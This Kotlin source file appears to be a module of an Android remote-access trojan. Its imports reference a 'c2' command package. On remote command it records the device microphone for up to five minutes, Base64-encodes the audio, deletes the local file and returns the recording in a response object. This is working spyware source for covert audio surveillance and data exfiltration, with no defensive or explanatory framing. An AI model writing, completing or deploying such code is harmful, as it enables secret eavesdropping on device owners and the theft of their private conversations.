package org.synapse.core.modules

import android.content.Context
import android.media.MediaRecorder
import android.util.Base64
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import java.io.File
import java.io.FileInputStream
import kotlinx.coroutines.*

object MicModule {

    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var isRecording = false

    @Volatile private var recordJob: Job? = null

    suspend fun record(context: Context, cmd: Command): SynapseResponse {
        if (isRecording) {
            return SynapseResponse.ErrorResponse("mic:already_recording", "mic")
        }

        val durationSec = (cmd.params["duration"]?.toIntOrNull() ?: 30).coerceIn(5, 300)

        return try {
            val file = File(context.cacheDir, "synapse_mic_${System.currentTimeMillis()}.aac")
            recordingFile = file

            val rec = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            recorder = rec
            isRecording = true

            // Auto-stop after duration
            recordJob = CoroutineScope(Dispatchers.IO).launch {
                delay(durationSec * 1000L)
                stopInternal()
            }

            SynapseResponse.MicRecordingResponse(
                audio_base64 = "",
                duration_seconds = durationSec,
                format = "AAC",
                size_bytes = 0
            ).let {
                // Override to indicate recording started
                @Suppress("DEPRECATION")
                SynapseResponse.ErrorResponse("mic:recording_started:${durationSec}s", "mic")
            }
        } catch (e: SecurityException) {
            cleanup()
            SynapseResponse.ErrorResponse("mic:permission_denied:${e.message}", "mic")
        } catch (e: Exception) {
            cleanup()
            SynapseResponse.ErrorResponse("mic:${e.message}", "mic")
        }
    }

    suspend fun stop(context: Context, cmd: Command): SynapseResponse {
        if (!isRecording) {
            return SynapseResponse.ErrorResponse("mic:not_recording", "mic")
        }
        return stopInternal()
    }

    private suspend fun stopInternal(): SynapseResponse {
        recordJob?.cancel()
        recordJob = null

        return try {
            val rec = recorder
            val file = recordingFile

            if (rec != null) {
                try { rec.stop() } catch (_: Exception) {}
                try { rec.release() } catch (_: Exception) {}
                recorder = null
            }

            isRecording = false

            if (file != null && file.exists() && file.length() > 0) {
                val bytes = file.readBytes()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                file.delete()
                recordingFile = null

                SynapseResponse.MicRecordingResponse(
                    audio_base64 = b64,
                    duration_seconds = 0,
                    format = "AAC",
                    size_bytes = bytes.size.toLong()
                )
            } else {
                SynapseResponse.ErrorResponse("mic:empty_recording", "mic")
            }
        } catch (e: Exception) {
            cleanup()
            SynapseResponse.ErrorResponse("mic:stop_failed:${e.message}", "mic")
        }
    }

    private fun cleanup() {
        try { recorder?.stop() } catch (_: Exception) {}
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
        isRecording = false
        recordJob?.cancel()
        recordJob = null
        recordingFile?.delete()
        recordingFile = null
    }
}
